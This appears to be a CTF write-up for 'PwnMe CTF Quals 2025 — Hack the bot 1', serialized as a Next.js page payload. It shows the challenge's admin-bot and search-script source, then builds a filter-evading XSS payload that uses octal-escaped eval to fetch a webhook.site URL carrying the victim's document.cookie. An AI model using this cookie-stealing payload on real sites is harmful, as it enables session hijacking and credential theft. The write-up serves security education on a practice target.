@@ -1,0 +1,174 @@
+1:"$Sreact.fragment"
+2:I[10453,["/_next/static/chunks/b9afcb09c56609a6.js","/_next/static/chunks/59d5dd52dd9fcb16.js","/_next/static/chunks/0eb309e820c00a6d.js","/_next/static/chunks/239c8c4944a9f036.js","/_next/static/chunks/39b99946d2be6a43.js"],"default"]
+20:I[97367,["/_next/static/chunks/ff1a16fafef87110.js","/_next/static/chunks/b71c1cfea9076b4b.js"],"OutletBoundary"]
+21:"$Sreact.suspense"
+:HL["https://gist.github.com/user-attachments/assets/9d840a9b-e1df-4c45-90b5-e9fddd514ea0","image"]
+:HL["https://gist.github.com/user-attachments/assets/b74639aa-e387-4e0a-af9c-166eaee374f5","image"]
+:HL["https://gist.github.com/user-attachments/assets/cf486ec9-946e-4c53-b7ee-80f2c4efab81","image"]
+3:T95e,const express = require('express');
+const path = require('path');
+const fs = require('fs');
+const { spawn } = require('child_process');
+const puppeteer = require('puppeteer');
+const { format } = require('date-fns');
+
+const app = express();
+const port = 5000;
+
+const logPath = '/tmp/bot_folder/logs/';
+const browserCachePath = '/tmp/bot_folder/browser_cache/';
+
+const cookie = {
+    name: 'Flag',
+    value: "PWNME{FAKE_FLAG}",
+    sameSite: 'Strict'
+};
+
+app.use(express.urlencoded({ extended: true }));
+
+app.use(express.static(path.join(__dirname, 'public')));
+
+app.set('views', path.join(__dirname, 'views'));
+app.set('view engine', 'ejs');
+
+if (!fs.existsSync(logPath)) {
+    fs.mkdirSync(logPath, { recursive: true });
+}
+
+if (!fs.existsSync(browserCachePath)) {
+    fs.mkdirSync(browserCachePath, { recursive: true });
+}
+
+const sleep = ms => new Promise(resolve => setTimeout(resolve, ms));
+
+async function startBot(url, name) {
+    const logFilePath = path.join(logPath, `${name}.log`);
+
+    try {
+        const logStream = fs.createWriteStream(logFilePath, { flags: 'a' });
+        logStream.write(`${new Date()} : Attempting to open website ${url}\n`);
+
+        const browser = await puppeteer.launch({
+            headless: 'new',
+            args: ['--remote-allow-origins=*','--no-sandbox', '--disable-dev-shm-usage', `--user-data-dir=${browserCachePath}`]
+        });
+
+        const page = await browser.newPage();
+        await page.goto(url);
+
+        if (url.startsWith("http://localhost/")) {
+            await page.setCookie(cookie);
+        }
+
+        logStream.write(`${new Date()} : Successfully opened ${url}\n`);
+        
+        await sleep(7000);
+        await browser.close();
+
+        logStream.write(`${new Date()} : Finished execution\n`);
+        logStream.end();
+    } catch (e) {
+        const logStream = fs.createWriteStream(logFilePath, { flags: 'a' });
+        logStream.write(`${new Date()} : Exception occurred: ${e}\n`);
+        logStream.end();
+    }
+}
+
+app.get('/', (req, res) => {
+    res.render('index');
+});
+
+app.get('/report', (req, res) => {
+    res.render('report');
+});
+
+app.post('/report', (req, res) => {
+    const url = req.body.url;
+    const name = format(new Date(), "yyMMdd_HHmmss");
+    startBot(url, name);
+    res.status(200).send(`logs/${name}.log`);
+});
+
+app.listen(port, () => {
+    console.log(`App running at http://0.0.0.0:${port}`);
+});0:{"buildId":"QiRS6Sx9Ttvp1BSl4xu2I","rsc":["$","$1","c",{"children":[["$","div",null,{"children":["$","main",null,{"className":"text-pretty max-w-5xl mx-auto text-sm [&_h1]:text-5xl [&_h1]:font-semibold [&_h1]:mb-8 [&_blockquote]:text-secondary [&_blockquote]:space-y-3 [&_blockquote]:border-l-4 [&_blockquote]:border-secondary [&_blockquote]:pl-5 [&_blockquote]:mb-5 [&>_p]:my-4 [&_img]:my-5 [&_ul]:list-disc [&_ul]:pl-6 [&_ol]:list-decimal [&_ol]:pl-6 [&_img]:rounded [&_li]:my-2","children":[["$","h1","h1-0",{"children":"PwnMe CTF Quals 2025 — Hack the bot 1"}],"\n",["$","blockquote","blockquote-0",{"children":["\n",["$","p","p-0",{"children":"I've developed a little application to help me with my pentest missions, with lots of useful payloads! I even let users add new payloads, but since I was in a rush I didn't have time to test the security of my application, could you take care of it ?"}],"\n"]}],"\n",["$","p","p-0",{"children":"We're given an express server that looks like this:"}],"\n",["$","$L2","pre-0",{"className":"my-2","children":"$3","language":"js"}],"\n","$L4","\n","$L5","\n","$L6","\n","$L7","\n","$L8","\n","$L9","\n","$La","\n","$Lb","\n","$Lc","\n","$Ld","\n","$Le","\n","$Lf","\n","$L10","\n","$L11","\n","$L12","\n","$L13","\n","$L14","\n","$L15","\n","$L16","\n","$L17","\n","$L18","\n","$L19"]}]}],["$L1a","$L1b","$L1c","$L1d"],"$L1e"]}],"loading":null,"isPartial":false}
+4:["$","p","p-1",{"children":"Seemingly, the server sets up a simple \"admin bot\" whose cookie we need to extract via XSS."}]
+5:["$","p","p-2",{"children":["But where is the XSS vulnerability? Looking in the script loaded by ",["$","code","code-0",{"className":"opacity-75 bg-black/10 dark:bg-black/30 rounded px-1.5 py-1 text-[0.9em]","children":"index.ejs"}],","]}]
+1f:T7b4,// Implements search functionality, filtering articles to display only those matching the search words (considering whole words case-insensitive matches)
+
+function getSearchQuery() {
+    const params = new URLSearchParams(window.location.search);
+    // Utiliser une valeur par défaut de chaîne vide si le paramètre n'existe pas
+    return params.get('q') ? params.get('q').toLowerCase() : '';
+}
+
+document.addEventListener('DOMContentLoaded', function() {
+    const searchQuery = getSearchQuery();
+    document.getElementById('search-input').value = searchQuery; 
+    if (searchQuery) {
+        searchArticles(searchQuery);
+    }
+});
+
+document.getElementById('search-icon').addEventListener('click', function() {
+    searchArticles();
+});
+
+document.getElementById('search-input').addEventListener('keypress', function(event) {
+    if (event.key === 'Enter') {
+        searchArticles();
+    }
+});
+
+function searchArticles(searchInput = document.getElementById('search-input').value.toLowerCase().trim()) {
+    const searchWords = searchInput.split(/[^\p{L}]+/u);
+    const articles = document.querySelectorAll('.article-box');
+    let found = false;
+    articles.forEach(article => {
+        if (searchInput === '') {
+            article.style.display = '';
+            found = true;
+        } else {
+            const articleText = article.textContent.toLowerCase();
+            const isMatch = searchWords.some(word => word && new RegExp(`${word}`, 'ui').test(articleText));
+            if (isMatch) {
+                article.style.display = '';
+                found = true;
+            } else {
+                article.style.display = 'none';
+            }
+        }
+    });
+    const noMatchMessage = document.getElementById('no-match-message');
+    if (!found && searchInput) {
+        noMatchMessage.innerHTML = `No results for "${searchInput}".`;
+        noMatchMessage.style.display = 'block';
+    } else {
+        noMatchMessage.style.display = 'none';
+    }
+}6:["$","$L2","pre-1",{"className":"my-2","children":"$1f","language":"js"}]
+7:["$","p","p-3",{"children":"The idea seems to be that"}]
+8:["$","ul","ul-0",{"children":["\n",["$","li","li-0",{"children":["The page automatically populates ",["$","code","code-0",{"className":"opacity-75 bg-black/10 dark:bg-black/30 rounded px-1.5 py-1 text-[0.9em]","children":"search-input"}]," with our passed-in query string."]}],"\n",["$","li","li-1",{"children":["For each \"word\" (tokens separated by ",["$","a","a-0",{"href":"https://www.regular-expressions.info/unicode.html#prop","children":"characters not in the unicode letter category"}],") in our query, we perform a case-insensitive Regex match against the text of each article on the page."]}],"\n",["$","li","li-2",{"children":["If no matches are found, we get direct ",["$","code","code-0",{"className":"opacity-75 bg-black/10 dark:bg-black/30 rounded px-1.5 py-1 text-[0.9em]","children":"innerHTML"}]," access -> XSS."]}],"\n"]}]
+9:["$","p","p-4",{"children":"But there's one last problem; the page's articles look like this:"}]
+a:["$","p","p-5",{"children":["$","img","img-0",{"src":"https://gist.github.com/user-attachments/assets/9d840a9b-e1df-4c45-90b5-e9fddd514ea0","alt":"image"}]}]
+b:["$","p","p-6",{"children":["so we need to be careful about choosing an XSS payload that doesn't match any of the banned tokens above. Looking ",["$","a","a-0",{"href":"https://portswigger.net/web-security/cross-site-scripting/cheat-sheet","children":"online"}],", one such payload is"]}]
+c:["$","p","p-7",{"children":["$","img","img-0",{"src":"https://gist.github.com/user-attachments/assets/b74639aa-e387-4e0a-af9c-166eaee374f5","alt":"image"}]}]
+d:["$","$L2","pre-2",{"className":"my-2","children":"<vinh oncontentvisibilityautostatechange=\"...\" style=display:block;content-visibility:auto>","language":"html"}]
+e:["$","p","p-8",{"children":["but our executed JS can't contain any of the banned tokens, either. To be safe, we can use JS's ",["$","a","a-0",{"href":"https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Deprecated_and_obsolete_features#escape_sequences","children":"deprecated octal escape sequence"}]," syntax to encode our payload as"]}]
+f:["$","$L2","pre-3",{"className":"my-2","children":"fetch(`https://webhook.site/b7d64b9c-1be5-4c70-8120-fd9fb57cc68a?a=${document.cookie}`)","language":"js"}]
+10:["$","$L2","pre-4",{"className":"my-2","children":"eval('\\146\\145\\164\\143\\150\\50\\140\\150\\164\\164\\160\\163\\72\\57\\57\\167\\145\\142\\150\\157\\157\\153\\56\\163\\151\\164\\145\\57\\142\\67\\144\\66\\64\\142\\71\\143\\55\\61\\142\\145\\65\\55\\64\\143\\67\\60\\55\\70\\61\\62\\60\\55\\146\\144\\71\\146\\142\\65\\67\\143\\143\\66\\70\\141\\77\\141\\75\\44\\173\\144\\157\\143\\165\\155\\145\\156\\164\\56\\143\\157\\157\\153\\151\\145\\175\\140\\51')","language":"js"}]
+11:["$","p","p-9",{"children":"One final hiccup: looking at the bot source again,"}]
+12:["$","$L2","pre-5",{"className":"my-2","children":"        const page = await browser.newPage();\n        await page.goto(url);\n\n        if (url.startsWith(\"http://localhost/\")) {\n            await page.setCookie(cookie);\n        }","language":"js"}]
+13:["$","p","p-10",{"children":["the admin visits the page ",["$","em","em-0",{"children":"before"}]," setting its cookie. As a simple solution, we can just sleep for a bit before exfiltrating the cookie via XSS,"]}]
+14:["$","$L2","pre-6",{"className":"my-2","children":"console.log([...'setTimeout(() => fetch(`https://webhook.site/b7d64b9c-1be5-4c70-8120-fd9fb57cc68a?a=${document.cookie}`), 3000)'].map(s => '\\\\' + s.charCodeAt(0).toString(8)).join(''))","language":"js"}]
+15:["$","p","p-11",{"children":"giving us a final payload looking like"}]
+16:["$","$L2","pre-7",{"className":"my-2","children":"<vinh oncontentvisibilityautostatechange=\"eval('\\163\\145\\164\\124\\151\\155\\145\\157\\165\\164\\50\\50\\51\\40\\75\\76\\40\\146\\145\\164\\143\\150\\50\\140\\150\\164\\164\\160\\163\\72\\57\\57\\167\\145\\142\\150\\157\\157\\153\\56\\163\\151\\164\\145\\57\\142\\67\\144\\66\\64\\142\\71\\143\\55\\61\\142\\145\\65\\55\\64\\143\\67\\60\\55\\70\\61\\62\\60\\55\\146\\144\\71\\146\\142\\65\\67\\143\\143\\66\\70\\141\\77\\141\\75\\44\\173\\144\\157\\143\\165\\155\\145\\156\\164\\56\\143\\157\\157\\153\\151\\145\\175\\140\\51\\54\\40\\63\\60\\60\\60\\51')\" style=display:block;content-visibility:auto>","language":"html"}]
+17:["$","p","p-12",{"children":"Reporting this to the bot, we get the flag:"}]
+18:["$","p","p-13",{"children":["$","img","img-0",{"src":"https://gist.github.com/user-attachments/assets/cf486ec9-946e-4c53-b7ee-80f2c4efab81","alt":"image"}]}]
+19:["$","$L2","pre-8",{"className":"my-2","children":"PWNME{D1d_y0U_S4iD-F1lt33Rs?}"}]
+1a:["$","script","script-0",{"src":"/_next/static/chunks/59d5dd52dd9fcb16.js","async":true}]
+1b:["$","script","script-1",{"src":"/_next/static/chunks/0eb309e820c00a6d.js","async":true}]
+1c:["$","script","script-2",{"src":"/_next/static/chunks/239c8c4944a9f036.js","async":true}]
+1d:["$","script","script-3",{"src":"/_next/static/chunks/39b99946d2be6a43.js","async":true}]
+1e:["$","$L20",null,{"children":["$","$21",null,{"name":"Next.MetadataOutlet","children":"$@22"}]}]
+22:null
